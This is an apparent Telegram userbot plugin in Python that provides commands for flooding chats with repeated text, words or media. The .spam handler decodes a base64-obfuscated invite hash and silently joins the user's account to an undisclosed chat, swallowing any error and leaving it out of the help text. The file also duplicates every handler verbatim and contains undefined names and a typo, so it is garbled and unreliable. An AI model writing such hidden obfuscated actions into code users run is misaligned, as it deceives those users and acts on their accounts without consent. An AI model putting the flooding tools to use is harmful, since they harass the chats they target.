import asyncio
import base64
import os

from telethon import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import CMD_HELP
from userbot.plugins import BOTLOG, BOTLOG_CHATID
from userbot.utils import lightning_cmd, edit_or_reply, sudo_cmd


@bot.on(lightning_cmd(pattern="spam (.*)"))
@bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TEMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        return await edit_or_reply(e, "Use `.bigspam` for spam greater than 50")
    if len(cat) == 2:
        spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    elif reply_to_id.media:
        to_download_directory = Config.TEMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await e.client.download_media(
            reply_to_id.media, downloaded_file_name
        )
        await e.delete()
        if os.path.exists(downloaded_file_name):
            sandy = None
            for _ in range(counter):
                if sandy:
                    sandy = await e.client.send_file(e.chat_id, sandy)
                else:
                    sandy = await e.client.send_file(e.chat_id, downloaded_file_name)
                try:
                    await e.client(
                        functions.messages.SaveGifRequest(
                            id=types.InputDocument(
                                id=sandy.media.document.id,
                                access_hash=sandy.media.document.access_hash,
                                file_reference=sandy.media.document.file_reference,
                            ),
                            unsave=True,
                        )
                    )
                except:
                    pass
                await asyncio.sleep(0.5)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message",
                    )
                    sandy = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=sandy.media.document.id,
                                    access_hash=sandy.media.document.access_hash,
                                    file_reference=sandy.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_name)
                else:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message",
                    )
                    sandy = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=sandy.media.document.id,
                                    access_hash=sandy.media.document.access_hash,
                                    file_reference=sandy.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_nam)
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    else:
        await edit_or_reply(e, "try again something went wrong or check `.info spam`")


@bot.on(lightning_cmd(pattern="bigspam (.*)"))
async def bigspam(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        message = e.text
        counter = int(message[9:13])
        spam_message = str(e.text[13:])
        for i in range(1, counter):
            await e.respond(spam_message)
        await e.delete()
        if LOGGER:
            await e.client.send_message(
                LOGGER_GROUP, "#BIGSPAM \n\n" "Bigspam was executed successfully"
            )


@bot.on(lightning_cmd("wspam (.*)"))
@bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
async def tmeme(e):
    wspam = str("".join(e.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await e.delete()
    for word in message:
        await e.respond(word)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`",
            )
        else:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
            )


@bot.on(lightning_cmd(pattern="mspam (.*)"))
async def tiny_pic_spam(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        message = e.text
        text = message.split()
        counter = int(text[1])
        link = str(text[2])
        for i in range(1, counter):
            await e.client.send_file(e.chat_id, link)
        await e.delete()
        if LOGGER:
            await e.client.send_message(
                LOGGER_GROUP, "#PICSPAM \n\n" "PicSpam was executed successfully"
            )


@bot.on(lightning_cmd("delayspam (.*)"))
async def spammer(e):
    spamDelay = float(e.pattern_match.group(1).split(" ", 2)[0])
    counter = int(e.pattern_match.group(1).split(" ", 2)[1])
    spam_message = str(e.pattern_match.group(1).split(" ", 2)[2])
    await e.delete()
    for i in range(1, counter):
        await e.respond(spam_message)
        await sleep(spamDelay)
    if LOGGER:
        await e.client.send_message(
            LOGGER_GROUP, "#DelaySPAM\n" "DelaySpam was executed successfully"
        )


@bot.on(lightning_cmd(pattern="spam (.*)"))
@bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TEMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        return await edit_or_reply(e, "Use `.bigspam` for spam greater than 50")
    if len(cat) == 2:
        spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    elif reply_to_id.media:
        to_download_directory = Config.TEMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await e.client.download_media(
            reply_to_id.media, downloaded_file_name
        )
        await e.delete()
        if os.path.exists(downloaded_file_name):
            sandy = None
            for _ in range(counter):
                if sandy:
                    sandy = await e.client.send_file(e.chat_id, sandy)
                else:
                    sandy = await e.client.send_file(e.chat_id, downloaded_file_name)
                try:
                    await e.client(
                        functions.messages.SaveGifRequest(
                            id=types.InputDocument(
                                id=sandy.media.document.id,
                                access_hash=sandy.media.document.access_hash,
                                file_reference=sandy.media.document.file_reference,
                            ),
                            unsave=True,
                        )
                    )
                except:
                    pass
                await asyncio.sleep(0.5)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message",
                    )
                    sandy = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=sandy.media.document.id,
                                    access_hash=sandy.media.document.access_hash,
                                    file_reference=sandy.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_name)
                else:
                    await e.client.send_message(
                        BOTLOG_CHATID,
                        "#SPAM\n"
                        + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message",
                    )
                    sandy = await e.client.send_file(
                        BOTLOG_CHATID, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=sandy.media.document.id,
                                    access_hash=sandy.media.document.access_hash,
                                    file_reference=sandy.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_nam)
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    else:
        await edit_or_reply(e, "try again something went wrong or check `.info spam`")


@bot.on(lightning_cmd(pattern="bigspam (.*)"))
async def bigspam(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        message = e.text
        counter = int(message[9:13])
        spam_message = str(e.text[13:])
        for i in range(1, counter):
            await e.respond(spam_message)
        await e.delete()
        if LOGGER:
            await e.client.send_message(
                LOGGER_GROUP, "#BIGSPAM \n\n" "Bigspam was executed successfully"
            )


@bot.on(lightning_cmd("wspam (.*)"))
@bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
async def tmeme(e):
    wspam = str("".join(e.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await e.delete()
    for word in message:
        await e.respond(word)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`",
            )
        else:
            await e.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
            )


@bot.on(lightning_cmd(pattern="mspam (.*)"))
async def tiny_pic_spam(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        message = e.text
        text = message.split()
        counter = int(text[1])
        link = str(text[2])
        for i in range(1, counter):
            await e.client.send_file(e.chat_id, link)
        await e.delete()
        if LOGGER:
            await e.client.send_message(
                LOGGER_GROUP, "#PICSPAM \n\n" "PicSpam was executed successfully"
            )


@bot.on(lightning_cmd("delayspam (.*)"))
async def spammer(e):
    spamDelay = float(e.pattern_match.group(1).split(" ", 2)[0])
    counter = int(e.pattern_match.group(1).split(" ", 2)[1])
    spam_message = str(e.pattern_match.group(1).split(" ", 2)[2])
    await e.delete()
    for i in range(1, counter):
        await e.respond(spam_message)
        await sleep(spamDelay)
    if LOGGER:
        await e.client.send_message(
            LOGGER_GROUP, "#DelaySPAM\n" "DelaySpam was executed successfully"
        )


CMD_HELP.update(
    {
        "spam": "**Plugin : **`spam`\
        \n\n**Syntax : **`.spam <count> <text>`\
        \n**Function : **__ Floods text in the chat !!__\
        \n\n**Syntax : **`.spam <count> reply to media`\
        \n**Function : **__Sends the replied media <count> times !!__\
        \nFor above two commands use `.bigspam` instead of spam for spamming more than 50 messages\
        \n\n**Syntax : **`.cspam <text>`\
        \n**Function : **__ Spam the text letter by letter.__\
        \n\n**Syntax : **`.wspam <text>`\
        \n**Function : **__ Spam the text word by word.__\
        \n\n**Syntax : **`.mspam \ <count> >reply to media> \`\
        \n**Function : **__ .mspam but with  media.__\
        \n\n\n**NOTE : Spam at your own risk !!**"
    }
)
